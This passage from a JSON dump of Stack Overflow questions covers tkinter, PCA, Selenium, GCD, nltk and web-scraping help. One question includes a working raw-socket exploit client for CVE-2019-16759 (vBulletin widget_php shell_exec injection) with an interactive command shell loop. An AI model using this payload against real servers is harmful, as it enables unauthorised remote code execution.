"last_edit_date": 1571870110, "creation_date": 1571869504, "answer_id": 58531717, "question_id": 58531579, "link": "https://stackoverflow.com/questions/58531579/frame-does-not-get-raised-when-using-frame-tkraise/58531717#58531717", "title": "frame does not get raised when using frame.tkraise()", "body": "<p>The root of your problem is that you are putting inner frames in the root window rather than in the page.</p>\n\n<p>You need to change this:</p>\n\n<pre><code>self.login_page = tk.Frame(width=self.screen_w, height=self.screen_h, background=\"#ABEBC6\")\nself.login_section = tk.Frame(width=100, height=100, background=\"#52BE80\")\n</code></pre>\n\n<p>... to this (note the <code>self</code> parameter when calling <code>Frame</code>):</p>\n\n<pre><code>self.login_page = tk.Frame(self, width=self.screen_w, height=self.screen_h, background=\"#ABEBC6\")\nself.login_section = tk.Frame(self, width=100, height=100, background=\"#52BE80\")\n</code></pre>\n\n<p>... and likewise for the Search page</p>\n\n<p>That brings up many other problems, but that's the root problem. Every widget you create in each of your \"pages\" needs to be within the frame of that \"page\".</p>\n\n<p>Another problem is that you're creating a frame called <code>root</code> inside of the main window, and you're putting everything else inside of <code>root</code>. However, you never call <code>pack</code>, <code>place</code>, or <code>grid</code> on <code>root</code>. Because of that, none of your widgets will show up.</p>\n\n<p>The simplest solution to that problem is to call <code>pack</code> on it:</p>\n\n<pre><code>root.pack(fill=\"both\", expand=True)\n</code></pre>\n\n<p>You also are showing the \"Search\" page on startup rather than the login page, so the login button will never show up.</p>\n\n<p>You need to call <code>self.show_frame(\"Login\")</code> instead of <code>self.show_frame(\"Search\")</code> in your <code>__init__</code>. </p>\n"}], "owner": {"reputation": 3, "user_id": 9711700, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e08a8c20cb5cac9ad52ca9c1c0364b88?s=128&d=identicon&r=PG&f=1", "display_name": "Amin", "link": "https://stackoverflow.com/users/9711700/amin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 204, "favorite_count": 0, "accepted_answer_id": 58531717, "answer_count": 1, "score": 0, "last_activity_date": 1571873136, "creation_date": 1571868528, "last_edit_date": 1571873136, "question_id": 58531579, "link": "https://stackoverflow.com/questions/58531579/frame-does-not-get-raised-when-using-frame-tkraise", "title": "frame does not get raised when using frame.tkraise()", "body": "<p>I'm trying to raise my 'Search' frame above 'Login' frame when user clicks on the 'Login' button. I think this might have something to do with how I'm stacking my frames, but am not sure what it exactly is.</p>\n\n<p>I tested if the show_frame function runs after user clicks on the 'Login' button, and it does, but the frame does not get lifted.</p>\n\n<pre><code>import tkinter as tk\n\nclass App(tk.Tk):\n\n    def __init__(self):\n        tk.Tk.__init__(self)\n\n        root = tk.Frame(self)\n\n        self.screen_w = root.winfo_screenwidth()\n        self.screen_h = root.winfo_screenheight()\n\n        self.frames = {}\n        for F in (Login, Search):\n            page_name = F.__name__\n            frame = F(parent=root, controller=self)\n            self.frames[page_name] = frame\n\n            frame.grid(row=0, column=0, sticky=\"nsew\")\n\n        self.show_frame(\"Search\")\n\n    def show_frame(self, page_name):\n        '''Show a frame for the given page name'''\n        frame = self.frames[page_name]\n        frame.tkraise()\n\nclass Login(tk.Frame):\n\n    def __init__(self, parent, controller):\n\n        tk.Frame.__init__(self, parent)\n        self.controller = controller\n\n        self.screen_w = controller.screen_w\n        self.screen_h = controller.screen_h\n\n        self.display()\n\n    def display(self):\n\n        #login page (frame)\n        self.login_page = tk.Frame(width=self.screen_w, height=self.screen_h, background=\"#ABEBC6\")\n        self.login_section = tk.Frame(width=100, height=100, background=\"#52BE80\")\n\n        self.login_page.pack()\n        self.login_section.place(in_=self.login_page, anchor=\"c\", relx = 0.5, rely = 0.5, relheight = 0.5, relwidth = 0.5)\n\n        self.login_button = tk.Button(self.login_section, text='Login', fg = 'black', bg = 'green')\n        self.login_button.place(relx = 0.5, rely = 0.55, relheight = 0.1, relwidth = 0.4, anchor = 'c')\n        self.login_button.bind('&lt;Button-1&gt;', self.check_login)\n\n    def check_login(self, event):\n\n        self.controller.show_frame('Search')\n\nclass Search(tk.Frame):\n\n    def __init__(self, parent, controller):\n\n        tk.Frame.__init__(self, parent)\n        self.controller = controller\n\n        self.screen_w = controller.screen_w\n        self.screen_h = controller.screen_h\n\n        self.display()\n\n    def display(self):\n\n            #search page (frame)\n            self.search_page = tk.Frame(width=self.screen_w, height=self.screen_h, background=\"#85C1E9\")\n            self.search_section = tk.Frame(width=100, height=100, background=\"#5DADE2\")\n\n            self.search_page.pack()\n            self.search_section.place(in_=self.search_page, relx = 0.5, rely = 0.5, relheight = 0.5, relwidth = 0.5, anchor = 'center')\n\nif __name__ == \"__main__\":\n    app = App()\n    app.mainloop()\n</code></pre>\n"}, {"tags": ["python", "scikit-learn", "pca"], "answers": [{"tags": [], "owner": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "is_accepted": true, "score": 2, "last_activity_date": 1571868969, "creation_date": 1571868969, "answer_id": 58531639, "question_id": 58531538, "link": "https://stackoverflow.com/questions/58531538/sklearn-decomposition-pca-get-components-by-given-ratio/58531639#58531639", "title": "Sklearn.decomposition.PCA: Get components by given ratio", "body": "<p>From the <a href=\"https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.PCA.html\" rel=\"nofollow noreferrer\">documentation</a>, you can see If 0 &lt; n_components &lt; 1 and svd_solver == 'full', select the number of components such that the amount of variance that needs to be explained is greater than the percentage specified by n_components.</p>\n\n<p>To get components that satisfy atleast 95% variance, use PCA(n_components=0.95, svd_solver='full')</p>\n"}], "owner": {"reputation": 4641, "user_id": 3446051, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/eb1zv.jpg?s=128&g=1", "display_name": "Code Pope", "link": "https://stackoverflow.com/users/3446051/code-pope"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 58531639, "answer_count": 1, "score": 0, "last_activity_date": 1571868969, "creation_date": 1571868117, "question_id": 58531538, "link": "https://stackoverflow.com/questions/58531538/sklearn-decomposition-pca-get-components-by-given-ratio", "title": "Sklearn.decomposition.PCA: Get components by given ratio", "body": "<p>I want to use PCA on some data to get the top principle components of a matrix that capture 95% of the total variance. I was looking for a function doing that, but I could not find a way.<br>\nThe only I could find out was the following: </p>\n\n<pre><code>from sklearn.decomposition import PCA\n# W_0 is a matrix \npca = PCA().fit(W_0)\n# get the index of the component which has variance higher than 0.95\nindex_component = np.min(np.argwhere(np.cumsum(pca.explained_variance_ratio_)&gt;0.95))\n# Now fit again with the given component \npca = PCA(n_components= index_component+1)\npca.fit(W_0)\n</code></pre>\n\n<p>The problem with this approach is that I am fitting two times which is performance bottleneck.\nIs there a better way to do that?</p>\n"}, {"tags": ["python", "selenium", "google-chrome"], "owner": {"reputation": 409, "user_id": 10181236, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-5bQoI5Vh3P0/AAAAAAAAAAI/AAAAAAAAB_c/z8TUCALIFNk/photo.jpg?sz=128", "display_name": "JayJona", "link": "https://stackoverflow.com/users/10181236/jayjona"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1588472726, "creation_date": 1571867766, "question_id": 58531485, "link": "https://stackoverflow.com/questions/58531485/how-to-open-a-specific-chrome-profile-and-interact-with-it-on-python", "title": "How to open a specific chrome profile and interact with it on python", "body": "<p>I need a script that opens a specific chrome profile and interacts by opening web pages using that profile. From another post on stackoverflow I found this code which in my case opens a different profile from the one I want.</p>\n\n<p>This is the code</p>\n\n<pre><code>from selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\noptions = Options()\noptions.add_argument(\"user-data-dir=C:\\\\Users\\\\giaco\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\")\ndriver = webdriver.Chrome(executable_path=r'D:\\chromedriver_win32\\chromedriver.exe', options=options)\ndriver.get(\"https://www.google.co.in\")\n</code></pre>\n\n<p>the profile I would like to use is to this path <a href=\"https://i.stack.imgur.com/h3QeF.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/h3QeF.png\" alt=\"enter image description here\"></a></p>\n\n<p>but the profile that is actually opened is this and it is not the profile I want but as if it were a guest profile\n<a href=\"https://i.stack.imgur.com/Q9Tk0.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Q9Tk0.png\" alt=\"enter image description here\"></a></p>\n\n<p>how can I use the profile I want?</p>\n"}, {"tags": ["python"], "answers": [{"tags": [], "owner": {"reputation": 97521, "user_id": 565635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/7b4b3e7c9ac68b7d2c93ad02d0b9c79d?s=128&d=identicon&r=PG", "display_name": "orlp", "link": "https://stackoverflow.com/users/565635/orlp"}, "is_accepted": false, "score": 4, "last_activity_date": 1571867857, "creation_date": 1571867857, "answer_id": 58531497, "question_id": 58531482, "link": "https://stackoverflow.com/questions/58531482/i-wrote-a-simple-code-to-find-gcd-of-two-numbers-and-i-tried-for-3-values-3-12/58531497#58531497", "title": "I wrote a simple code to find GCD of two numbers and i tried for 3 values (3, 12), (35, 24), (24,12)", "body": "<p>You are missing <code>return</code> in your recursive calls. For example,</p>\n\n<pre><code>gcd(a, b % a)\n</code></pre>\n\n<p>should be:</p>\n\n<pre><code>return gcd(a, b % a)\n</code></pre>\n\n<p>You also have an issue that you don't return anything when <code>a == b</code>. Since when <code>a == b</code> neither <code>a &lt; b</code> or <code>a &gt; b</code> is true. Can you solve that?</p>\n"}], "owner": {"reputation": 21, "user_id": 12265602, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-EBzRz074MkE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdPFi_VmUmhXJNEJQyzuxqs92syaw/photo.jpg?sz=128", "display_name": "Rasika Jannawar", "link": "https://stackoverflow.com/users/12265602/rasika-jannawar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1571871365, "creation_date": 1571867734, "last_edit_date": 1571870289, "question_id": 58531482, "link": "https://stackoverflow.com/questions/58531482/i-wrote-a-simple-code-to-find-gcd-of-two-numbers-and-i-tried-for-3-values-3-12", "title": "I wrote a simple code to find GCD of two numbers and i tried for 3 values (3, 12), (35, 24), (24,12)", "body": "<p>The below code returns None for value(35, 24) can anyone suggest why instead of 1 it is displaying None while it is working fine for other values?</p>\n\n<p>I have tried with the below solution</p>\n\n<pre><code>def gcd(a, b):\n    if a &lt; b:\n        if b % a == 0:\n            return a\n        else:\n            gcd(a, b % a)\n    elif a &gt; b:\n        if a % b == 0:\n            return b\n        else:\n            gcd(b, a % b)\n\nprint gcd(35, 24)\n</code></pre>\n\n<p>I expect the output  to be 1, but the actual output is None</p>\n"}, {"tags": ["python", "nltk"], "comments": [{"owner": {"reputation": 6489, "user_id": 5086255, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XiEYC.jpg?s=128&g=1", "display_name": "sahasrara62", "link": "https://stackoverflow.com/users/5086255/sahasrara62"}, "edited": false, "score": 0, "creation_date": 1571867923, "post_id": 58531461, "comment_id": 103386779, "body": "<code>from nltk.tokenize import sent_tokenize</code>"}, {"owner": {"reputation": 365, "user_id": 2089830, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/37e16cd24352fae8c9a95ffa4a8dff75?s=128&d=identicon&r=PG", "display_name": "RJ Uy", "link": "https://stackoverflow.com/users/2089830/rj-uy"}, "reply_to_user": {"reputation": 6489, "user_id": 5086255, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XiEYC.jpg?s=128&g=1", "display_name": "sahasrara62", "link": "https://stackoverflow.com/users/5086255/sahasrara62"}, "edited": false, "score": 0, "creation_date": 1571868068, "post_id": 58531461, "comment_id": 103386831, "body": "sent_tokenize  will convert the whole paragraph into sentences.  What I am looking for is to convert list of words (processed word_tokenize in my case) into a sentence."}], "answers": [{"tags": [], "owner": {"reputation": 1659, "user_id": 11592902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca7aba16b2740a92412f757b635ba6a8?s=128&d=identicon&r=PG&f=1", "display_name": "DBaker", "link": "https://stackoverflow.com/users/11592902/dbaker"}, "is_accepted": false, "score": 0, "last_activity_date": 1572182939, "creation_date": 1572182939, "answer_id": 58579857, "question_id": 58531461, "link": "https://stackoverflow.com/questions/58531461/convert-word-tokenize-to-sentence/58579857#58579857", "title": "Convert word_tokenize to sentence", "body": "<p>nltk has TreebankWordDetokenizer which can reconstruct a sentence from a list of tokens:</p>\n\n<pre><code>from nltk import word_tokenize\ntokens = word_tokenize(\"I'm happy because it's a good book\")\nprint(tokens)\n#['I', \"'m\", 'happy', 'because', 'it', \"'s\", 'a', 'good', 'book']\n\nfrom nltk.tokenize.treebank import TreebankWordDetokenizer\nreconstructedSentence = TreebankWordDetokenizer().detokenize(tokens)\nprint(reconstructedSentence)\n#I'm happy because it's a good book\n\n</code></pre>\n"}], "owner": {"reputation": 365, "user_id": 2089830, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/37e16cd24352fae8c9a95ffa4a8dff75?s=128&d=identicon&r=PG", "display_name": "RJ Uy", "link": "https://stackoverflow.com/users/2089830/rj-uy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1572182939, "creation_date": 1571867573, "last_edit_date": 1571871144, "question_id": 58531461, "link": "https://stackoverflow.com/questions/58531461/convert-word-tokenize-to-sentence", "title": "Convert word_tokenize to sentence", "body": "<p>I am new to Python nltk</p>\n\n<p>Current, I have a program that does word_tokenize from a sentence.  The word_tokenize is then processed that corrects some capitalization to some nouns.  This process works fine, now I want to convert the processed word_tokenize to a sentence again.  I can easily do this by a loop and for every display, I just need to add space.  But there will be cases that this will not work for words like \"it's, I'm, don't and etc.\" because word_tokenize save those words separately.  Doing so my processed word_tokenize will be converted to \"it 's, I 'm, don 't and etc.\"</p>\n\n<p>Is there a function of nltk that does the word_tokenize to sentence perfectly?</p>\n"}, {"tags": ["python", "sockets", "websocket"], "comments": [{"owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "edited": false, "score": 1, "creation_date": 1571877677, "post_id": 58531452, "comment_id": 103388778, "body": "Are you sure your content-length header is correct? I suggest that you create the string once in a different variable (instead of writing the same code twice) and collect it&#39;s length. This would prevent surprises if you change anything."}, {"owner": {"reputation": 47, "user_id": 11330792, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bbeb6d7c8d4f607b8aa416e441f243?s=128&d=identicon&r=PG&f=1", "display_name": "DL_Engineer", "link": "https://stackoverflow.com/users/11330792/dl-engineer"}, "reply_to_user": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "edited": false, "score": 0, "creation_date": 1571908686, "post_id": 58531452, "comment_id": 103398391, "body": "Yea that was one of the first things I check and double checked. Good idea on the variable!"}], "answers": [{"tags": [], "owner": {"reputation": 449289, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": true, "score": 1, "last_activity_date": 1571880203, "last_edit_date": 1571880203, "creation_date": 1571879134, "answer_id": 58532775, "question_id": 58531452, "link": "https://stackoverflow.com/questions/58531452/raw-sockets-taking-5-seconds-for-a-response-on-localhost/58532775#58532775", "title": "Raw Sockets taking 5 seconds for a response on localhost", "body": "<p>Your client code is not parsing the server's response at all.  It is just blindly reading arbitrary chunks of data until there is nothing left to read.</p>\n\n<p>You need to <strong>PARSE THE RESPONSE</strong> in order to know:</p>\n\n<ul>\n<li><p>how much data is actually being sent.</p></li>\n<li><p>in what encoding format the data is being sent (in particular, whether HTTP's <code>Transfer-Encoding: chunked</code> encoding is being used or not).</p></li>\n<li><p>whether the server leaves the connection open or closes it after sending the response.</p></li>\n</ul>\n\n<p>You need to parse the response to know when you have reached the end of the response and should STOP READING.  Refer to <a href=\"https://tools.ietf.org/html/rfc2616#section-4.4\" rel=\"nofollow noreferrer\">RFC 2616 Section 4.4</a> and <a href=\"https://tools.ietf.org/html/rfc7230#section-3.3\" rel=\"nofollow noreferrer\">RFC 7230 Section 3.3</a> for the proper rules you need to follow to detect the end of the response (look at the pseudo code in <a href=\"https://stackoverflow.com/a/19211701/65863\">this answer</a> to <a href=\"https://stackoverflow.com/questions/19199066/\">When is an HTTP response finished?</a>).</p>\n\n<p>Since your client is sending <code>Connection: keep-alive</code> in its request, the server is likely actually keeping the connection open (ie, there is no <code>Connection: close</code> header in the response), in which case your client would just sit there idle waiting for more data to arrive after it has reached the end of the response.  Eventually, the server will close the connection when the client doesn't send a new HTTP request over the same connection (check if the response has a <code>Keep-Alive</code> header specifying a <code>timeout</code> interval).  That would account for the delay you are experiencing.</p>\n\n<p>If you are not going to parse the response to detect the proper end of transmission, then try sending <code>Connection: close</code> instead in your HTTP request so the server will close the connection at the end of the response, breaking your reading loop immediately at the end of the response.  You would still need to handle <code>Transfer-Encoding: chunked</code> properly, though.</p>\n\n<p>Only once you reach the end of the response, and have buffered all of the raw body data, can you then <code>decode()</code> the complete data.  You are trying to <code>decode()</code> each arbitrary block of raw bytes, which will not work for multi-byte charsets like UTF-8 if byte sequences straddle across block boundaries.  It also won't work correctly if you don't account for, and strip off, any HTTP <code>chunked</code> boundaries.</p>\n"}], "owner": {"reputation": 47, "user_id": 11330792, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bbeb6d7c8d4f607b8aa416e441f243?s=128&d=identicon&r=PG&f=1", "display_name": "DL_Engineer", "link": "https://stackoverflow.com/users/11330792/dl-engineer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 58532775, "answer_count": 1, "score": 0, "last_activity_date": 1571880203, "creation_date": 1571867546, "last_edit_date": 1571879302, "question_id": 58531452, "link": "https://stackoverflow.com/questions/58531452/raw-sockets-taking-5-seconds-for-a-response-on-localhost", "title": "Raw Sockets taking 5 seconds for a response on localhost", "body": "<p>I am trying to create a raw socket implementation of the <a href=\"https://seclists.org/fulldisclosure/2019/Sep/31\" rel=\"nofollow noreferrer\">CVE-2019-16759 proof of concept</a>.</p>\n\n<p>When my code runs, it makes the correct <code>POST</code> request, and gets back the response [looking at WireShark I can confirm this], but it takes 5 seconds, while the non-socket implementation is instant.</p>\n\n<p>I've noticed that the <code>POST</code> request has this \"continuation\" part in the packet info, that I don't see when running the proof of concept.</p>\n\n<p><a href=\"https://i.stack.imgur.com/Ttl3Y.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Ttl3Y.png\" alt=\"image\"></a></p>\n\n<p>My socket library that creates the <code>POST</code> request:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import socket\nimport urllib.parse\n\nclass socket_http:\n\n    req = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def __init__(self, HOSTURL, PORT=80, COMMAND=\"id\"):\n        self.parsedURL = urllib.parse.urlparse(HOSTURL)\n        self.PORT = PORT\n        self.cmd = COMMAND\n        self.req.connect((self.parsedURL.netloc,PORT))\n\n    def closeSocket(self):\n        self.req.close()\n\n    def post(self, URL, connectionType=\"\", HTTP_version=\"1.1\"):\n        postURL = urllib.parse.urlparse(URL)\n\n        postReq = \"\"\n        if postURL.path == \"\":\n            postReq += \"POST / HTTP/\" + HTTP_version + \"\\r\\n\"\n        else:\n            postReq += \"POST \" + postURL.path + \" HTTP/\" + HTTP_version + \"\\r\\n\"\n        postReq += \"Host: \" + postURL.netloc + \":\" + str(self.PORT) + \"\\r\\n\"\n        postReq += \"User-Agent: python-requests/2.21.0\\r\\n\"\n        postReq += \"Accept-Encoding: gzip, deflate\\r\\n\"\n        postReq += \"Accept: */*\\r\\n\"\n        postReq += \"Connection: keep-alive\\r\\n\"\n        postReq += \"Content-Length: \" + str(len(\"routestring=ajax/render/widget_php&amp;widgetConfig[code]=echo shell_exec('\" + self.cmd + \"'); exit;\")) + \"\\r\\n\"\n        postReq += \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\"\n        postReq += \"routestring=ajax/render/widget_php&amp;widgetConfig[code]=echo shell_exec('\" + self.cmd + \"'); exit;\\r\\n\"\n\n        self.req.send(postReq.encode())\n\n        chunks = []\n        while True:\n            chunk = self.req.recv(int(1024)).decode()\n            if chunk:\n                chunks.append(1024)\n            else:\n                break\n\n        return ''.join(chunks)\n</code></pre>\n\n<p>My code that runs the exploit:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>from socket_req import socket_http as socket\nimport sys\n\nHOST = \"http://127.0.0.1\"\nPORT = 82\n\nwhile True:\n    try:\n        session = socket(HOST, PORT)\n        session.cmd = input(\"$hell~\")\n        print(session.cmd)\n        answer = session.post(HOST)\n        print(answer)\n        session.closeSocket()\n    except KeyboardInterrupt as e:\n        session.closeSocket()\n        sys.exit(\"\\nClosing shell...\")\n    except Exception as e:\n        session.closeSocket()\n        sys.exit(str(e))\n</code></pre>\n\n<p>I want to find the root issue to why the request is taking so long to reply compared to the POC, which is instant (you can see in the WireShark capture that the <code>POST</code> request was sent at 2.3 seconds and the reply comes at 7.3 seconds). When I run this script, this is what happens:</p>\n\n<pre><code>$hell~ls\nls\n'utf-8' codec can't decode byte 0x8b in position 274: invalid start byte\n</code></pre>\n\n<p>I believe there are two issues here, the first being the long delay and the second being the \"invalid start byte\" error.</p>\n"}, {"tags": ["python", "web-scraping", "beautifulsoup"], "comments": [{"owner": {"reputation": 71123, "user_id": 6241235, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/dCxzx.png?s=128&g=1", "display_name": "QHarr", "link": "https://stackoverflow.com/users/6241235/qharr"}, "edited": false, "score": 0, "creation_date": 1571882932, "post_id": 58531428, "comment_id": 103389675, "body": "I don&#39;t see any shipping prices listed on the page."}], "answers": [{"tags": [], "owner": {"reputation": 144, "user_id": 7853356, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sZRF2ug_f-c/AAAAAAAAAAI/AAAAAAAAAMw/kf1N4MJ1qzg/photo.jpg?sz=128", "display_name": "SamHDev", "link": "https://stackoverflow.com/users/7853356/samhdev"}, "is_accepted": false, "score": 0, "last_activity_date": 1571874721, "creation_date": 1571874721, "answer_id": 58532346, "question_id": 58531428, "link": "https://stackoverflow.com/questions/58531428/how-to-pull-the-shipping-price-from-banggood-com-using-beautifulsoup/58532346#58532346", "title": "how to pull the shipping price from banggood.com using beautifulsoup", "body": "<p>The issue is the 'Free Shipping' is generated by JavaScript after the page loads, rather than being sent in the webpage.</p>\n\n<p>It might obtain the Shipping price by performing a HTTP request after the page has loaded or it may be hidden within the page</p>\n\n<p>You might be able to try to find the XHR Request to pulls the Shipping price using DevTools in Firefox or chrome using the 'networking' tab and using that to get the price.</p>\n"}, {"comments": [{"owner": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "edited": false, "score": 0, "creation_date": 1571924646, "post_id": 58539205, "comment_id": 103406971, "body": "sp there is no way to get the shipping price with beautifulsoup?     and about your url, when I try to open it I get error 404 (page not found) , and when I replace it in your code with my url I get run-time exception, why is that?"}, {"owner": {"reputation": 17276, "user_id": 7752296, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7033ea69df1e9dddbee828dc92ac967a?s=128&d=identicon&r=PG&f=1", "display_name": "chitown88", "link": "https://stackoverflow.com/users/7752296/chitown88"}, "reply_to_user": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "edited": false, "score": 0, "creation_date": 1571931114, "post_id": 58539205, "comment_id": 103410629, "body": "that url is ajax request and needs to be accompanied with the query parameters. You can&#39;t just pop that into you browser to return the data, nor can you replace it with your specific url (they are different). However, it MAY be possible to get that shipping cost. I&#39;ll take a look in a few minutes to see if it&#39;s possible."}, {"owner": {"reputation": 17276, "user_id": 7752296, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7033ea69df1e9dddbee828dc92ac967a?s=128&d=identicon&r=PG&f=1", "display_name": "chitown88", "link": "https://stackoverflow.com/users/7752296/chitown88"}, "reply_to_user": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "edited": false, "score": 0, "creation_date": 1571932176, "post_id": 58539205, "comment_id": 103411150, "body": "just checked and no you will not be able to get the shipping cost straight out of requests from your URL and beautifulsoup. As stated below, it&#39;s javascript generated. Now sometimes that data is imbedded in <code>&lt;script&gt;</code> tags in the html source, but tht&#39;s not the case here. Your only options are a) use the method I used by requesting the XHR which is where the site fetches that data, or b) use something like Selenium to allow the html to render first (and then you could use beautifulsoup). That however is dependant on the attributes of the tags, and if they are dynamic, is not robust"}, {"owner": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "edited": false, "score": 0, "creation_date": 1571948141, "post_id": 58539205, "comment_id": 103418052, "body": "about option b, if i&#39;ll just sleep for few seconds would I be able to pull it with beautifulsoup??            how can I get this &quot;strong&quot; with selenium?"}, {"owner": {"reputation": 17276, "user_id": 7752296, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7033ea69df1e9dddbee828dc92ac967a?s=128&d=identicon&r=PG&f=1", "display_name": "chitown88", "link": "https://stackoverflow.com/users/7752296/chitown88"}, "reply_to_user": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "edited": false, "score": 0, "creation_date": 1571988265, "post_id": 58539205, "comment_id": 103427607, "body": "no. To simply use sleep wouldn&#39;t work with requests (don&#39;t be confused with pulling the html source and parsing it). Beautifulsoup has nothing with obtaining the html, it works with pull data out once you have html source.. You&#39;d have to use selenium. I&#39;ll work on a selenium solution this morning and post it back here."}], "tags": [], "owner": {"reputation": 17276, "user_id": 7752296, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7033ea69df1e9dddbee828dc92ac967a?s=128&d=identicon&r=PG&f=1", "display_name": "chitown88", "link": "https://stackoverflow.com/users/7752296/chitown88"}, "is_accepted": false, "score": 0, "last_activity_date": 1571912356, "creation_date": 1571912356, "answer_id": 58539205, "question_id": 58531428, "link": "https://stackoverflow.com/questions/58531428/how-to-pull-the-shipping-price-from-banggood-com-using-beautifulsoup/58539205#58539205", "title": "how to pull the shipping price from banggood.com using beautifulsoup", "body": "<p>Using the XHR, you can find that data:</p>\n\n<pre><code>import requests\nfrom bs4 import BeautifulSoup\nimport json\n\nurl = 'https://m.banggood.com/ajax/product/dynamicPro/index.html'\n\npayload = {\n'c': 'api',\n'sq': 'IY38TmCNgDhATYCmIDGxYisATHA7ANn2HwX2RNwEYrcAGAVgDNxawIQFhLpFhkOCuZFFxA'}\n\nresponse = requests.get(url, params=payload).json()\n\ndata = response['result']\n\nshipping = data['shipment']\nfor each in shipping.items():\n    print (each)\n\nprint (shipping['shipCost'])\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>print (shipping['shipCost'])\n&lt;b&gt;Free Shipping&lt;/b&gt;\n</code></pre>\n"}], "owner": {"reputation": 47, "user_id": 10908521, "user_type": "registered", "profile_image": "https://graph.facebook.com/2425688974168303/picture?type=large", "display_name": "Achikam Mor", "link": "https://stackoverflow.com/users/10908521/achikam-mor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 294, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1571912356, "creation_date": 1571867375, "last_edit_date": 1571893655, "question_id": 58531428, "link": "https://stackoverflow.com/questions/58531428/how-to-pull-the-shipping-price-from-banggood-com-using-beautifulsoup", "title": "how to pull the shipping price from banggood.com using beautifulsoup", "body": "<p>i'm trying to get the shipping price from this link:\n<a href=\"https://www.banggood.com/Xiaomi-Mi-Air-Laptop-2019-13_3-inch-Intel-Core-i7-8550U-8GB-RAM-512GB-PCle-SSD-Win-10-NVIDIA-GeForce-MX250-Fingerprint-Sensor-Notebook-p-1535887.html?rmmds=search&amp;cur_warehouse=CN\" rel=\"nofollow 